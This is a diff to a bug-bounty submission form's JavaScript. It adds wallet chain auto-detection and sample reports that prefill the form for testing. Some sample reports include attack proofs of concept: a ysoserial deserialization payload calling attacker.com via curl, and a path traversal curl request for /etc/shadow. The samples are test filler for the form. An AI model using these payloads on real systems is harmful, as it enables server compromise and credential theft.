@@ -416,6 +416,7 @@ document.getElementById("reportForm").addEventListener("submit", async (e) => {
     severity: document.querySelector('input[name="severity"]:checked').value,
     description: document.getElementById("bugDescription").value,
     reporterWallet: document.getElementById("reporterWallet").value,
+    chain: document.getElementById("chainSelect").value,
   };
 
   try {
@@ -484,6 +485,18 @@ const GOOD_REPORTS = [
     description: "Steps to reproduce:\n1. Craft a malicious serialized Java object using ysoserial\n2. POST it to /api/import with Content-Type: application/x-java-serialized-object\n3. The server deserializes the payload and executes arbitrary commands\n\nImpact: Full server compromise. Attacker can execute arbitrary system commands.\n\nProof of Concept:\njava -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/pwned' | base64\ncurl -X POST /api/import -d @payload.bin\n\nAffected version: 2.3.1 (uses commons-collections 3.2.1)\nRoot cause: ObjectInputStream.readObject() on untrusted input.\n\nRecommended fix: Use a whitelist-based deserialization filter or switch to JSON.",
     wallet: "0x5566778899AABBCCDDEEFF0011223344556677FF",
   },
+  {
+    title: "Path traversal in file download endpoint",
+    severity: "high",
+    description: "Steps to reproduce:\n1. Send GET /api/files/download?path=../../etc/passwd\n2. The server returns the contents of /etc/passwd\n3. Any file readable by the server process can be downloaded\n\nImpact: Arbitrary file read. Attacker can access config files with database credentials, API keys, and private keys.\n\nProof of Concept:\ncurl \"https://app.example.com/api/files/download?path=../../../etc/shadow\"\n\nAffected endpoint: GET /api/files/download\nRoot cause: Path parameter passed directly to fs.readFile without sanitization.\n\nRecommended fix: Use path.resolve and verify the resolved path is within the allowed directory.",
+    wallet: "7EcDhSYGxXyscszYEp35KHN8vvw3svAuLKTzXwCFLtV",
+  },
+  {
+    title: "Information disclosure via debug endpoint",
+    severity: "medium",
+    description: "Steps to reproduce:\n1. Send GET /debug/vars\n2. The server returns all environment variables including:\n   - DATABASE_URL with username and password\n   - AWS_SECRET_ACCESS_KEY\n   - JWT_SECRET\n\nImpact: Full credential disclosure. Attacker gains access to all external services.\n\nAffected endpoint: GET /debug/vars\nThis endpoint is accessible without authentication in production.\n\nRecommended fix: Remove debug endpoints in production or gate them behind authentication.",
+    wallet: "TN2YqTv5rFcGBzSJMWFQsdwUY9dp31AQLF",
+  },
 ];
 
 const MEDIUM_REPORTS = [
@@ -530,25 +543,25 @@ const BAD_REPORTS = [
     title: "website looks weird",
     severity: "low",
     description: "the colors are off on mobile, not sure if this is a security thing",
-    wallet: "0x0000000000000000000000000000000000000001",
+    wallet: "0x1234567890AbcdEF1234567890aBcDEF12345678",
   },
   {
     title: "error message",
     severity: "medium",
     description: "i got an error once but didnt screenshot it. maybe you should look into it?",
-    wallet: "0x0000000000000000000000000000000000000002",
+    wallet: "0xABCDEF1234567890abcdef1234567890AbCdEf12",
   },
   {
     title: "your site might have bugs",
     severity: "high",
     description: "heard from a friend that sites like yours usually have vulnerabilities. you should probably check things.",
-    wallet: "0x0000000000000000000000000000000000000003",
+    wallet: "0x9876543210FeDcBa9876543210fEdCbA98765432",
   },
   {
     title: "placeholder test report",
     severity: "low",
     description: "testing 123. this is a test. just checking if the form works.",
-    wallet: "0x0000000000000000000000000000000000000004",
+    wallet: "0xDeadBeef00000000000000000000000012345678",
   },
 ];
 
@@ -565,6 +578,38 @@ function fillGoodReport() { fillForm(pick(GOOD_REPORTS)); }
 function fillMediumReport() { fillForm(pick(MEDIUM_REPORTS)); }
 function fillBadReport() { fillForm(pick(BAD_REPORTS)); }
 function fillRandomReport() { fillForm(pick([...GOOD_REPORTS, ...MEDIUM_REPORTS, ...BAD_REPORTS])); }
+
+// Auto-detect chain from wallet address
+const CHAIN_DETECT = [
+  { pattern: /^0x[0-9a-fA-F]{40}$/, chain: "evm", label: "EVM" },
+  { pattern: /^T[1-9A-HJ-NP-Za-km-z]{33}$/, chain: "tron", label: "Tron" },
+  { pattern: /^(bc1[a-zA-HJ-NP-Z0-9]{25,87}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})$/, chain: "bitcoin", label: "Bitcoin" },
+  { pattern: /^cosmos1[a-z0-9]{38}$/, chain: "cosmos", label: "Cosmos" },
+  { pattern: /^[1-9A-HJ-NP-Za-km-z]{32,44}$/, chain: "solana", label: "Solana" },
+];
+
+function detectChain(address) {
+  for (const { pattern, chain, label } of CHAIN_DETECT) {
+    if (pattern.test(address)) return { chain, label };
+  }
+  return null;
+}
+
+document.getElementById("reporterWallet").addEventListener("input", () => {
+  const addr = document.getElementById("reporterWallet").value.trim();
+  const chainSelect = document.getElementById("chainSelect");
+  const detected = document.getElementById("detectedChain");
+  if (chainSelect.value === "auto" && addr.length > 10) {
+    const result = detectChain(addr);
+    if (result) {
+      detected.textContent = "Detected: " + result.label;
+    } else {
+      detected.textContent = "";
+    }
+  } else {
+    detected.textContent = "";
+  }
+});
 
 // Character counter for description
 function updateCharCounter() {
